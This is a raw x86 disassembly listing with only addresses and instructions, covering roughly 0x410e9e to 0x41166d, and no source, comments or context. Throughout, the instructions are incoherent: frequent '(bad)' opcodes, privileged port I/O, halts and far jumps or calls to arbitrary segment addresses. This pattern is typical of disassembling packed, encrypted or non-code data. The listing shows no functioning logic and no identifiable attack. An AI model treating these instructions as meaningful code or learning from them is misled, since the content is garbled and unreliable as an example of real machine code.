  410e9e:	outs   dx,DWORD PTR ds:[esi]
  410e9f:	(bad)  [esi]
  410ea1:	sbb    BYTE PTR [esi],ah
  410ea3:	iret   
  410ea4:	sub    DWORD PTR [ecx+0x66],ebp
  410ea7:	lds    ebp,FWORD PTR [esi]
  410ea9:	mov    ds:0x11828619,al
  410eae:	push   edx
  410eaf:	and    BYTE PTR [eax],bl
  410eb1:	ret    0x4145
  410eb4:	mov    ds:0x7a0d7582,eax
  410eb9:	fs dec edx
  410ebb:	aas    
  410ebc:	mov    cl,0x6
  410ebe:	imul   ebp,DWORD PTR [eax+edi*8],0x73
  410ec2:	add    DWORD PTR [edi+ebp*2-0x37],esp
  410ec6:	rcr    BYTE PTR [eax+eax*8-0x12],0x36
  410ecb:	fist   WORD PTR [edi]
  410ecd:	mov    ds:0x1c282150,al
  410ed2:	or     eax,0x1dc196a2
  410ed7:	xor    cl,bl
  410ed9:	(bad)  [edi]
  410edb:	pusha  
  410edc:	call   0x4ca10c7d
  410ee1:	xor    DWORD PTR [esi],edx
  410ee3:	jae    0x410eac
  410ee5:	jmp    0xc01da85a
  410eea:	mov    ds:0x9bf5b326,eax
  410eef:	cmp    eax,0x5d7f1e8a
  410ef4:	push   esp
  410ef5:	jg     0x410eea
  410ef7:	data16 (bad) 
  410ef9:	ficom  WORD PTR [ecx+0x37]
  410efc:	loop   0x410f19
  410efe:	js     0x410f0b
  410f00:	scas   al,BYTE PTR es:[edi]
  410f01:	aaa    
  410f02:	rcr    DWORD PTR [ebx],cl
  410f04:	mov    esp,0xaf0efef7
  410f09:	push   0xffffffd9
  410f0b:	popa   
  410f0c:	fidiv  WORD PTR [edx+ebp*8]
  410f0f:	outs   dx,DWORD PTR ds:[esi]
  410f10:	daa    
  410f11:	pop    ecx
  410f12:	or     esp,DWORD PTR [edi+0xa]
  410f15:	fst    QWORD PTR [ebx]
  410f18:	mov    ah,BYTE PTR [ecx]
  410f1a:	mov    edx,0xaac4d163
  410f1f:	leave  
  410f20:	out    0xb8,eax
  410f22:	pop    ecx
  410f23:	shr    BYTE PTR [esi],0xf4
  410f26:	mov    edi,0x2af18490
  410f2b:	es jbe 0x410eb3
  410f2e:	sbb    DWORD PTR [ecx],esp
  410f30:	sbb    al,0xa8
  410f32:	push   ebp
  410f33:	jne    0x410f98
  410f35:	jl     0x410f10
  410f37:	lahf   
  410f38:	sub    eax,0xd3562717
  410f3d:	jo     0x410ef1
  410f3f:	sbb    al,BYTE PTR [esi-0x6a0cb469]
  410f45:	mov    eax,ds:0x5568d6d9
  410f4a:	iret   
  410f4b:	mov    ah,0x41
  410f4d:	retf   
  410f4e:	shl    dh,0xe5
  410f51:	pop    eax
  410f52:	lods   al,BYTE PTR ds:[esi]
  410f53:	pop    esi
  410f54:	sbb    DWORD PTR [eax+ebx*2-0x64237e96],ecx
  410f5b:	js     0x410f6f
  410f5d:	imul   esp,DWORD PTR [ecx],0x20
  410f60:	mov    dl,0x83
  410f62:	rcr    BYTE PTR [eax-0x45b5fcb6],0xcb
  410f69:	scas   eax,DWORD PTR es:[edi]
  410f6a:	xchg   ebx,eax
  410f6b:	(bad)  
  410f6c:	popa   
  410f6d:	pop    edi
  410f6e:	push   ecx
  410f6f:	pop    ss
  410f70:	cs ds jg 0x410f7b
  410f74:	rol    BYTE PTR [edi],0x4
  410f77:	mov    dh,0xcc
  410f79:	cli    
  410f7a:	leave  
  410f7b:	int3   
  410f7c:	fldcw  WORD PTR [edi-0x56]
  410f7f:	mov    ebp,0x93f2d09f
  410f84:	(bad)  
  410f85:	lds    esp,FWORD PTR [ebx]
  410f87:	mov    ecx,0x715142e3
  410f8c:	mov    ?,WORD PTR [ebx+0x30c24ceb]
  410f92:	stos   DWORD PTR es:[edi],eax
  410f93:	mov    dl,0x6
  410f95:	jb     0x410f33
  410f97:	outs   dx,BYTE PTR ds:[esi]
  410f98:	push   ecx
  410f99:	call   0x5046:0x287060dc
  410fa0:	fild   WORD PTR [edx+0x1c204edd]
  410fa6:	mov    esp,0x99877aea
  410fab:	hlt    
  410fac:	adc    al,0x6d
  410fae:	ja     0x41100e
  410fb0:	fwait
  410fb1:	cmp    BYTE PTR ds:0xa6f4de42,0x7d
  410fb8:	arpl   WORD PTR [ecx-0x4864b65f],bx
  410fbe:	(bad)  
  410fbf:	into   
  410fc0:	sub    dl,BYTE PTR [edi-0x25b754f4]
  410fc6:	call   FWORD PTR [edx]
  410fc8:	pop    ds
  410fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fca:	add    DWORD PTR [ebp+esi*8+0x12ef546b],edi
  410fd1:	mov    bl,0x88
  410fd3:	or     ah,BYTE PTR [ebp-0x7e]
  410fd6:	shr    DWORD PTR [ecx+0x35],1
  410fd9:	dec    esi
  410fda:	scas   al,BYTE PTR es:[edi]
  410fdb:	pop    ecx
  410fdc:	repz ss mov edi,0xe9ef4e3
  410fe3:	jno    0x410feb
  410fe5:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410fe7:	dec    edi
  410fe8:	pop    ebx
  410fe9:	add    ebp,DWORD PTR [ebx-0x2f9c5831]
  410fef:	push   cs
  410ff0:	xchg   esi,eax
  410ff1:	call   FWORD PTR [eax+eiz*2]
  410ff4:	jbe    0x410fd6
  410ff6:	test   eax,0x79e61bc5
  410ffb:	sar    DWORD PTR ds:0xa7123eb9,cl
  411001:	sub    ah,BYTE PTR [ebx-0x56]
  411004:	jge    0x410fa5
  411006:	gs inc esi
  411008:	inc    esi
  411009:	or     al,0x3f
  41100b:	pop    ecx
  41100c:	jb     0x41101c
  41100e:	repnz pop ds
  411010:	adc    al,0x51
  411012:	ja     0x411034
  411014:	pop    eax
  411015:	fwait
  411016:	pop    edx
  411017:	cdq    
  411018:	adc    ebp,DWORD PTR [esi-0x5d8be4a]
  41101e:	mov    eax,0xde1f92fd
  411023:	xor    eax,0xc1afa4b4
  411028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411029:	push   ebx
  41102a:	(bad)  
  41102c:	test   eax,0xbef22734
  411031:	push   ebp
  411032:	cmp    cl,BYTE PTR [edi+0x5a]
  411035:	mov    dl,0x94
  411037:	fdivrp st(1),st
  411039:	aaa    
  41103a:	aad    0xd6
  41103c:	mov    DWORD PTR [ecx+0x5235eb1f],esi
  411042:	lock fisttp WORD PTR [ebx+0x61]
  411046:	jns    0x411057
  411048:	xchg   edx,eax
  411049:	add    al,0xb0
  41104b:	aas    
  41104c:	pusha  
  41104d:	retf   
  41104e:	popa   
  41104f:	pop    ds
  411050:	dec    eax
  411051:	or     edx,DWORD PTR [ebx-0x218b4297]
  411057:	clc    
  411058:	out    dx,al
  411059:	sub    eax,0xcbf1195e
  41105e:	xor    esi,DWORD PTR ds:0xdc7ac7
  411064:	mov    edi,0xe42f00b7
  411069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41106a:	and    bh,BYTE PTR [esi-0x1c]
  41106d:	daa    
  41106e:	loop   0x4110a6
  411070:	add    eax,DWORD PTR [esi+ebx*2]
  411073:	icebp  
  411074:	repnz test eax,0x66769ad
  41107a:	jge    0x41107e
  41107c:	data16 and dh,BYTE PTR [edx]
  41107f:	ins    DWORD PTR es:[edi],dx
  411080:	(bad)
  411085:	mov    esp,0xb928e4a4
  41108a:	ds or  edx,ecx
  41108d:	mov    ah,0xf9
  41108f:	inc    ecx
  411090:	mov    al,0xa0
  411092:	add    bh,BYTE PTR [esp+ebp*8-0x1c917706]
  411099:	fs jns 0x411026
  41109c:	jo     0x41105f
  41109e:	icebp  
  41109f:	mov    ebp,0xdf75a716
  4110a4:	push   cs
  4110a5:	sbb    al,0x68
  4110a7:	jl     0x411107
  4110a9:	jmp    0x4952:0x2cbaba3a
  4110b0:	sub    al,0x11
  4110b2:	cs pusha 
  4110b4:	xchg   ebp,eax
  4110b5:	das    
  4110b6:	jno    0x411063
  4110b8:	cmp    DWORD PTR [ecx+edi*2+0x8880937],0xffffffdb
  4110c0:	xchg   ebp,eax
  4110c1:	push   0xeb84bc77
  4110c6:	out    0xf5,eax
  4110c8:	lods   eax,DWORD PTR ds:[esi]
  4110c9:	into   
  4110ca:	push   ds
  4110cb:	xchg   al,al
  4110cd:	dec    edi
  4110ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110cf:	ss fwait
  4110d1:	call   0x77e2:0xf0a5e159
  4110d8:	pushf  
  4110d9:	xchg   edi,eax
  4110da:	jmp    0x411077
  4110dc:	pop    ds
  4110dd:	fisttp DWORD PTR [edi]
  4110df:	or     dl,BYTE PTR [eax-0x6a]
  4110e2:	push   eax
  4110e3:	lods   eax,DWORD PTR ds:[esi]
  4110e4:	popa   
  4110e5:	in     eax,0x15
  4110e7:	inc    edi
  4110e8:	adc    dl,al
  4110ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110eb:	mov    dl,0x3d
  4110ed:	pop    edx
  4110ee:	cmp    cl,al
  4110f0:	cdq    
  4110f1:	(bad)  
  4110f2:	dec    esi
  4110f3:	adc    DWORD PTR [ecx-0x12],ebx
  4110f6:	nop
  4110f7:	cdq    
  4110f8:	mov    ch,BYTE PTR [ebx]
  4110fa:	pop    ecx
  4110fb:	mov    ch,BYTE PTR [ecx+0x3c]
  4110fe:	sbb    eax,0xf9d16790
  411103:	and    al,BYTE PTR [ebp-0x4a1622db]
  411109:	and    BYTE PTR [edx],bl
  41110b:	(bad)  
  41110c:	push   eax
  41110d:	mov    eax,0x2c85d7ae
  411112:	or     eax,0x3ec4b977
  411117:	adc    ebp,DWORD PTR [ebx+eax*8+0x34063d5d]
  41111e:	aam    0xdd
  411120:	dec    ebp
  411121:	jno    0x411102
  411123:	gs xchg BYTE PTR gs:0x49777f6f,cl
  41112b:	pop    ss
  41112c:	rol    BYTE PTR [edi-0x61],cl
  41112f:	jg     0x411156
  411131:	xchg   ebp,eax
  411132:	sar    DWORD PTR [ebx-0x67],cl
  411135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411136:	add    eax,0x1df600d9
  41113b:	jnp    0x41111a
  41113d:	clc    
  41113e:	int    0xed
  411140:	jno    0x411150
  411142:	push   esi
  411143:	inc    esp
  411144:	adc    BYTE PTR [ecx],bl
  411146:	fcomp  DWORD PTR ss:[ecx+0x25fdb0c0]
  41114d:	pop    eax
  41114e:	push   ds
  41114f:	pop    edi
  411150:	sub    ah,ch
  411152:	ret    
  411153:	(bad)  
  411154:	retf   0x892e
  411157:	jg     0x41113c
  411159:	call   0x76f6:0x94230207
  411160:	cmp    BYTE PTR [edx],al
  411162:	xor    cl,bh
  411164:	popa   
  411165:	or     edi,DWORD PTR [ecx]
  411167:	adc    ebp,DWORD PTR [ebx+0x56]
  41116a:	adc    bh,BYTE PTR [eax-0x3b9de0ef]
  411170:	iret   
  411171:	adc    ch,BYTE PTR [ebx]
  411173:	mov    al,al
  411175:	sar    BYTE PTR [ebp+0x3b],1
  411178:	lods   eax,DWORD PTR ds:[esi]
  411179:	mov    ebx,0x1d0481cd
  41117e:	pop    ss
  41117f:	adc    DWORD PTR [ebx+0x6f94d2b3],0xa3b5c8d4
  411189:	ficomp WORD PTR [esp+ebp*4]
  41118c:	inc    esi
  41118d:	es icebp 
  41118f:	inc    edx
  411190:	hlt    
  411191:	inc    ebx
  411192:	mov    DWORD PTR [ebp+0x204f0db3],esp
  411198:	jp     0x411213
  41119a:	ins    BYTE PTR es:[edi],dx
  41119b:	lods   al,BYTE PTR ds:[esi]
  41119c:	xor    BYTE PTR [eax+0x34],bh
  41119f:	jbe    0x4111da
  4111a1:	in     al,dx
  4111a2:	sub    eax,0x975ae4ec
  4111a7:	aaa    
  4111a8:	sub    BYTE PTR [eax+0x3581ecec],ch
  4111ae:	sub    dh,BYTE PTR [esp-0x6b]
  4111b2:	jmp    0x9760:0x57465034
  4111b9:	test   ch,bl
  4111bb:	test   BYTE PTR [esp+ecx*8+0x18db9709],al
  4111c2:	lock push ds
  4111c4:	lods   al,BYTE PTR ds:[esi]
  4111c5:	cmp    BYTE PTR [ecx+edx*8-0x1c],dh
  4111c9:	pushf  
  4111ca:	jp     0x41114c
  4111cc:	xchg   esp,eax
  4111cd:	vpsubd xmm0,xmm4,xmm2
  4111d1:	and    dh,BYTE PTR [ecx-0x54432198]
  4111d7:	jae    0x411217
  4111d9:	loopne 0x4111ac
  4111db:	icebp  
  4111dc:	into   
  4111dd:	arpl   si,ax
  4111df:	push   ss
  4111e0:	imul   esp,edi,0x1c
  4111e3:	cs cli 
  4111e5:	push   es
  4111e6:	adc    BYTE PTR [esi+eiz*8+0x65eaafc3],bh
  4111ed:	jmp    0xcb1d:0xcfccb207
  4111f4:	std    
  4111f5:	and    dh,bh
  4111f7:	pusha  
  4111f8:	xlat   BYTE PTR ds:[ebx]
  4111f9:	sub    ebx,0xa9d4331d
  4111ff:	cmp    ebp,DWORD PTR [ebx+0x12a82fb3]
  411205:	pop    esp
  411206:	popa   
  411207:	push   ss
  411208:	hlt    
  411209:	mov    ds:0xbdbfaccf,eax
  41120e:	add    edx,esp
  411210:	adc    eax,0x2b35017c
  411215:	popa   
  411216:	pop    es
  411217:	inc    esp
  411218:	add    DWORD PTR [ebp+0x39],esp
  41121b:	dec    eax
  41121c:	pop    es
  41121d:	lock ret 0xb9d3
  411221:	mov    eax,ds:0x73c24eb4
  411226:	shr    DWORD PTR [edx+0x6fd628b6],cl
  41122c:	jge    0x411276
  41122e:	sbb    BYTE PTR [ebx],cl
  411230:	in     eax,dx
  411231:	ja     0x4111b3
  411233:	das    
  411234:	inc    esi
  411235:	pop    eax
  411236:	xlat   BYTE PTR ds:[ebx]
  411237:	jae    0x411224
  411239:	push   0xcfbf99b1
  41123e:	sbb    bh,BYTE PTR [edi+0x36c348e4]
  411244:	je     0x4112ac
  411246:	xchg   esp,eax
  411247:	mov    bh,0xf8
  411249:	fst    QWORD PTR [eax-0x7c]
  41124c:	jle    0x4111ee
  41124e:	or     BYTE PTR [ecx+0xf],cl
  411251:	outs   dx,BYTE PTR ds:[esi]
  411252:	loop   0x41126d
  411254:	test   eax,0x9a0cdc91
  411259:	cmp    cl,ah
  41125b:	sti    
  41125c:	fisttp WORD PTR [edi+eax*1]
  41125f:	jge    0x4112b4
  411261:	hlt    
  411262:	dec    edx
  411263:	std    
  411264:	inc    edi
  411265:	and    ecx,DWORD PTR [esi]
  411267:	xchg   DWORD PTR [ecx+0x5d],ebx
  41126a:	cmc    
  41126b:	sub    BYTE PTR [edi-0x272a2aad],bl
  411271:	dec    edx
  411272:	mov    ecx,0xeb950b95
  411277:	cmp    edi,DWORD PTR [ebx]
  411279:	ds mov bh,dl
  41127c:	retf   
  41127d:	daa    
  41127e:	ins    DWORD PTR es:[edi],dx
  41127f:	out    0x96,al
  411281:	mov    cl,0x41
  411283:	mov    al,ds:0x5f6ed272
  411288:	and    eax,0x8ed1b7d9
  41128d:	std    
  41128e:	and    al,0x9f
  411290:	mov    edi,DWORD PTR ds:0x664f74eb
  411296:	jnp    0x411293
  411298:	xchg   esp,eax
  411299:	and    eax,0x71206a44
  41129e:	aam    0xa6
  4112a0:	test   BYTE PTR [ebx],0x88
  4112a3:	xor    BYTE PTR [edi-0x6fb99539],bl
  4112a9:	repz jp 0x411311
  4112ac:	add    ebx,esp
  4112ae:	dec    esp
  4112af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112b0:	ja     0x411273
  4112b2:	scas   eax,DWORD PTR es:[edi]
  4112b3:	aaa    
  4112b4:	sbb    edx,ebp
  4112b6:	xchg   DWORD PTR [eax-0x49],esi
  4112b9:	js     0x411256
  4112bb:	xchg   BYTE PTR [edx-0x79c25144],bh
  4112c1:	sbb    esp,esp
  4112c3:	xchg   ebp,ebx
  4112c5:	dec    eax
  4112c6:	jp     0x4112db
  4112c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112c9:	dec    edi
  4112ca:	add    eax,0x15fe4f7
  4112cf:	sar    DWORD PTR [eax-0x33],cl
  4112d2:	dec    esi
  4112d3:	cwde   
  4112d4:	test   BYTE PTR [ecx],al
  4112d6:	hlt    
  4112d7:	ds je  0x411271
  4112da:	add    dl,BYTE PTR [esp+eax*2]
  4112dd:	mov    ebx,0x92009246
  4112e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112e3:	pop    ebx
  4112e4:	enter  0xf719,0x50
  4112e8:	xchg   esi,eax
  4112e9:	ja     0x411333
  4112eb:	and    ebp,DWORD PTR ds:0x43d0d7f6
  4112f1:	sbb    bh,BYTE PTR [ebx+0x13]
  4112f4:	jmp    0xaec:0x5afb526c
  4112fb:	not    BYTE PTR [edx-0x5]
  4112fe:	enter  0x81af,0x79
  411302:	idiv   DWORD PTR [eax+0x70]
  411305:	push   esi
  411306:	pop    ebp
  411307:	mov    eax,ds:0x58c7d058
  41130c:	adc    edi,DWORD PTR [ebx+ebp*1]
  41130f:	mov    dh,0x9c
  411311:	aas    
  411312:	rol    ebx,1
  411314:	adc    ah,bl
  411316:	jge    0x4112ac
  411318:	fidivr DWORD PTR [eax]
  41131a:	nop
  41131b:	rol    DWORD PTR [esi+eax*8-0x367ada58],1
  411322:	outs   dx,BYTE PTR ds:[esi]
  411323:	mov    eax,eax
  411325:	or     ebp,DWORD PTR [ebx-0x75ffeba7]
  41132b:	add    bh,ah
  41132d:	xor    DWORD PTR [ebp-0x46],esi
  411330:	jns    0x41135f
  411332:	pop    ebx
  411333:	imul   ebp,DWORD PTR [esi],0x50ee232b
  411339:	cmc    
  41133a:	(bad)  
  41133b:	push   0xffffffe1
  41133d:	push   eax
  41133e:	dec    ebx
  41133f:	pop    eax
  411340:	mov    dh,0x47
  411342:	mov    BYTE PTR [ecx+eax*8+0x7d],ch
  411346:	aas    
  411347:	arpl   cx,cx
  411349:	out    0xe,eax
  41134b:	cmp    al,0xfd
  41134d:	aaa    
  41134e:	push   esi
  41134f:	cli    
  411350:	jae    0x4113a8
  411352:	imul   eax,DWORD PTR [ebx-0x4713734f],0xffffff90
  411359:	jb     0x4113da
  41135b:	jmp    0x6da6541d
  411360:	cmc    
  411361:	sbb    al,0xf8
  411363:	neg    BYTE PTR [ebp+0x676223fb]
  411369:	into   
  41136a:	xchg   edx,eax
  41136b:	xchg   ecx,eax
  41136c:	fsub   DWORD PTR [ebx-0x4e]
  41136f:	jg     0x4113e9
  411371:	inc    ebp
  411372:	xor    al,0xc3
  411374:	lds    esi,FWORD PTR [edx+0x412f7dda]
  41137a:	in     al,0x36
  41137c:	inc    ebp
  41137d:	or     bh,BYTE PTR [edi]
  41137f:	loop   0x4113f3
  411381:	push   esi
  411382:	jnp    0x411366
  411384:	aas    
  411385:	test   BYTE PTR [esi-0x2a],0x4c
  411389:	add    DWORD PTR [esi+0x52],esp
  41138c:	adc    DWORD PTR [edx+0x640e0e2],ebx
  411392:	dec    ebx
  411393:	mov    DWORD PTR [edi+0x2d04bc66],ebx
  411399:	mov    cl,0xa6
  41139b:	push   esp
  41139c:	add    cl,BYTE PTR [eax-0x78e0b7fa]
  4113a2:	adc    DWORD PTR [edi-0x95808f9],esi
  4113a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113a9:	retf   0x6ff0
  4113ac:	jbe    0x411354
  4113ae:	jne    0x41134f
  4113b0:	rol    WORD PTR ds:0x55f443e3,cl
  4113b7:	push   ds
  4113b8:	(bad)  
  4113b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ba:	shl    BYTE PTR [edi-0x50],cl
  4113bd:	aad    0x2
  4113bf:	sub    ebp,DWORD PTR [ecx+0xa7bea28]
  4113c5:	cwde   
  4113c6:	aad    0x81
  4113c8:	gs jns 0x41141d
  4113cb:	retf   
  4113cc:	push   0x23
  4113ce:	pop    eax
  4113cf:	test   eax,0x4c0e113e
  4113d4:	lods   eax,DWORD PTR ds:[esi]
  4113d5:	in     eax,0x3
  4113d7:	adc    ebp,esi
  4113d9:	repnz cmp bh,BYTE PTR [ecx-0x70]
  4113dd:	outs   dx,BYTE PTR ds:[esi]
  4113de:	pop    edx
  4113df:	out    0xb7,eax
  4113e1:	sub    BYTE PTR [edi],0xd1
  4113e4:	pop    esi
  4113e5:	test   BYTE PTR [ecx+0x27e938aa],ch
  4113eb:	mov    edx,ebx
  4113ed:	bound  ecx,QWORD PTR [ecx-0x33]
  4113f0:	jl     0x411448
  4113f2:	sub    eax,0x9a77dc64
  4113f7:	(bad)  
  4113f8:	inc    DWORD PTR [eax+0x14fc43dc]
  4113fe:	sahf   
  4113ff:	push   ebx
  411400:	adc    dh,BYTE PTR [eax]
  411402:	add    cl,BYTE PTR [ebp+0x35]
  411405:	aam    0xb8
  411407:	(bad)  
  411409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41140a:	sti    
  41140b:	push   edx
  41140c:	leave  
  41140d:	ret    0x24dd
  411410:	int3   
  411411:	add    al,0xdd
  411413:	push   0xffffffc0
  411415:	push   ds
  411416:	add    esp,DWORD PTR [ebx+0x44]
  411419:	stc    
  41141a:	and    DWORD PTR [ebp+edx*1+0x6366cdff],0xe7b77667
  411425:	pop    edx
  411426:	dec    ebp
  411427:	(bad)
  41142a:	imul   BYTE PTR [ebp+0x62]
  41142d:	in     eax,dx
  41142e:	(bad)  
  41142f:	push   0x26
  411431:	and    DWORD PTR [edi+0x70],ecx
  411434:	xchg   ebp,eax
  411435:	adc    bl,dh
  411437:	mov    bl,0x4d
  411439:	fcomp  DWORD PTR [eax+ebp*8-0x31]
  41143d:	jge    0x41147d
  41143f:	cmp    eax,0xc12a1001
  411444:	adc    eax,0xa9b01b8c
  411449:	mov    bh,0x9e
  41144b:	pop    edi
  41144c:	stos   DWORD PTR es:[edi],eax
  41144d:	push   ecx
  41144e:	loop   0x411472
  411450:	inc    edi
  411451:	jae    0x411429
  411453:	nop
  411454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411455:	mov    bl,0x2
  411457:	add    esp,esp
  411459:	hlt    
  41145a:	mov    eax,0xb133453a
  41145f:	pop    ss
  411460:	push   esp
  411461:	inc    esp
  411462:	std    
  411463:	call   0x504aaead
  411468:	jecxz  0x41146f
  41146a:	fnstcw WORD PTR [esi+esi*1+0x31b586dd]
  411471:	dec    ebx
  411472:	lods   eax,DWORD PTR ds:[esi]
  411473:	mov    bh,0x71
  411475:	into   
  411476:	mov    ds:0x88a750e7,eax
  41147b:	sub    BYTE PTR [eax+0x4ee770bc],0x40
  411482:	push   esp
  411483:	ret    0x3a70
  411486:	inc    edi
  411487:	cld    
  411488:	pop    edx
  411489:	out    0xfa,eax
  41148b:	dec    edi
  41148c:	xchg   ebx,eax
  41148d:	das    
  41148e:	fistp  QWORD PTR [ebp-0x6bb1a9aa]
  411494:	push   ss
  411495:	imul   edx,DWORD PTR [esp+edx*1+0x6a],0xfdf2f40f
  41149d:	xchg   BYTE PTR [ebx+esi*1],bl
  4114a0:	sbb    eax,0xb33c84c0
  4114a5:	cmp    al,0x36
  4114a7:	sbb    BYTE PTR [eax+0x2ea8f166],cl
  4114ad:	mov    ds:0x91f569ef,al
  4114b2:	jns    0x41149f
  4114b4:	lods   eax,DWORD PTR ds:[esi]
  4114b5:	push   es
  4114b6:	adc    DWORD PTR [eax+0xa6d8dab],edx
  4114bc:	shl    BYTE PTR [ebx+0x97c0c36],1
  4114c2:	dec    ebx
  4114c3:	out    0x72,eax
  4114c5:	ficom  DWORD PTR [esp+ebp*4-0x4c]
  4114c9:	push   edi
  4114ca:	lods   eax,DWORD PTR ds:[esi]
  4114cb:	jno    0x411519
  4114cd:	shl    BYTE PTR [edi],0x58
  4114d0:	retf   0x3d99
  4114d3:	shr    al,0xb
  4114d6:	add    ecx,DWORD PTR [ebx]
  4114d8:	adc    DWORD PTR [ebx+edi*8+0x650e5dc8],edi
  4114df:	xor    eax,0x3a8cab5e
  4114e4:	xchg   edi,eax
  4114e5:	add    eax,0x725eda1b
  4114ea:	pushf  
  4114eb:	xchg   esi,eax
  4114ec:	fsub   QWORD PTR [esi-0x76574d6b]
  4114f2:	imul   esp,DWORD PTR [eax],0xca99128
  4114f8:	aaa    
  4114f9:	sub    ecx,DWORD PTR [ebx+0x60]
  4114fc:	adc    esp,DWORD PTR [ebx+edi*8-0x2e]
  411500:	push   es
  411501:	out    dx,al
  411502:	sub    al,0x39
  411504:	mov    esi,0x27daa0cd
  411509:	jecxz  0x411513
  41150b:	cmp    eax,0x973eb577
  411510:	xchg   esi,eax
  411511:	data16 jmp 0x411517
  411514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411515:	adc    esi,0xfffffff2
  411518:	in     al,dx
  411519:	fldcw  WORD PTR [edi-0x118fea30]
  41151f:	sbb    al,0xb8
  411521:	js     0x411578
  411523:	sbb    BYTE PTR [eax+0x2e],ch
  411526:	push   esi
  411527:	inc    ebx
  411528:	jne    0x41153d
  41152a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41152b:	jg     0x411551
  41152d:	or     edx,edi
  41152f:	repnz idiv BYTE PTR [edi+edi*2]
  411533:	test   eax,0x82ba6500
  411538:	lsl    edi,sp
  41153b:	mov    eax,ds:0x9213910d
  411540:	push   es
  411541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411542:	ds inc edx
  411544:	jmp    0x10db0232
  411549:	imul   esi,DWORD PTR [esi],0x60521621
  41154f:	int    0x4f
  411551:	jb     0x411554
  411553:	jle    0x411558
  411555:	mov    al,BYTE PTR [esi-0x177823c0]
  41155b:	xor    BYTE PTR [edi-0x15774050],ch
  411561:	shl    BYTE PTR [eax-0x30],0x46
  411565:	adc    dh,BYTE PTR [ebx-0x536f3d1]
  41156b:	arpl   WORD PTR [eax],bp
  41156d:	jle    0x411568
  41156f:	pop    ebx
  411570:	(bad)  
  411571:	retf   0xa6b9
  411574:	push   0x3278af78
  411579:	mov    al,ds:0xc06aa19b
  41157e:	xchg   esp,eax
  41157f:	push   0xa2797875
  411584:	add    eax,DWORD PTR [esi-0x43]
  411587:	ins    DWORD PTR es:[edi],dx
  411588:	and    ebx,edx
  41158a:	adc    BYTE PTR [edx+0x43],dh
  41158d:	addr16 in al,0x63
  411590:	jmp    0x6a35:0xcdce41ea
  411597:	mov    al,ds:0xe12709df
  41159c:	enter  0xfcd,0x79
  4115a0:	xchg   ebx,eax
  4115a1:	xchg   ebp,eax
  4115a2:	call   FWORD PTR [edi+eax*8]
  4115a5:	xor    BYTE PTR [edi+0x30],0xd4
  4115a9:	add    eax,0xa7533867
  4115ae:	add    ebp,edx
  4115b0:	int    0xff
  4115b2:	into   
  4115b3:	adc    eax,0xaeeab588
  4115b8:	dec    ecx
  4115b9:	mov    bl,BYTE PTR [edx-0x6c]
  4115bc:	push   ebp
  4115bd:	mov    ch,0x3e
  4115bf:	cdq    
  4115c0:	pop    ecx
  4115c1:	out    dx,eax
  4115c2:	jo     0x411569
  4115c4:	ins    DWORD PTR es:[edi],dx
  4115c5:	dec    ebp
  4115c6:	mov    ecx,0x989a6b75
  4115cb:	cmp    bh,BYTE PTR [ecx-0x6c]
  4115ce:	mov    esi,0xb9915475
  4115d3:	dec    esp
  4115d4:	inc    ebx
  4115d5:	fwait
  4115d6:	test   BYTE PTR ds:0xb76a1919,0x95
  4115dd:	bound  eax,QWORD PTR [esi+edi*1]
  4115e0:	mov    ebx,0x847501bc
  4115e5:	enter  0x8d01,0x5b
  4115e9:	pop    es
  4115ea:	and    DWORD PTR [edi-0x61fbb686],esi
  4115f0:	xor    eax,0x8eb5ad3f
  4115f5:	cs push 0x30
  4115f8:	int3   
  4115f9:	push   eax
  4115fa:	out    dx,al
  4115fb:	lock sbb edx,edi
  4115fe:	cs cdq 
  411600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411601:	inc    edx
  411602:	push   cs
  411603:	inc    edx
  411604:	mov    al,0xfb
  411606:	pop    ss
  411607:	mov    bl,0xb
  411609:	xchg   edi,eax
  41160a:	popa   
  41160b:	call   0xcc84e94c
  411610:	(bad)  
  411611:	push   esi
  411612:	xchg   esp,eax
  411613:	mov    BYTE PTR [edi-0x144e47be],ah
  411619:	pushf  
  41161a:	push   cs
  41161b:	(bad)  
  41161c:	pop    ebp
  41161d:	mov    al,0x93
  41161f:	fwait
  411620:	ror    DWORD PTR ss:[eax+eax*4-0x52e8e028],0x92
  411629:	xor    BYTE PTR [ecx+0x2a],ch
  41162c:	ins    DWORD PTR es:[edi],dx
  41162d:	pop    esi
  41162e:	xchg   DWORD PTR [eax+0x1b],edx
  411631:	outs   dx,BYTE PTR ds:[esi]
  411632:	add    bh,BYTE PTR [edx]
  411634:	xor    eax,eax
  411636:	fadd   st,st(1)
  411638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411639:	call   0xff12:0xd0868994
  411640:	mov    dh,0x8b
  411642:	pusha  
  411643:	xchg   ebx,eax
  411644:	adc    BYTE PTR [edx+0x3057a4ab],dl
  41164a:	xchg   esp,eax
  41164b:	addr16 aas 
  41164d:	and    BYTE PTR [esi],al
  41164f:	mov    bh,0xdf
  411651:	inc    ebp
  411652:	mov    esp,DWORD PTR [ebx]
  411654:	jb     0x4116c4
  411656:	sub    dl,BYTE PTR [esi]
  411658:	out    0x49,eax
  41165a:	sti    
  41165b:	loope  0x411619
  41165d:	hlt    
  41165e:	xchg   esp,eax
  41165f:	mov    BYTE PTR [esi-0x60],cl
  411662:	mov    bh,0x86
  411664:	sub    ebx,DWORD PTR [ecx+0x5841ebf1]
  41166a:	pusha  
  41166b:	std    
  41166c:	cmc    
  41166d:	in     eax,0x2
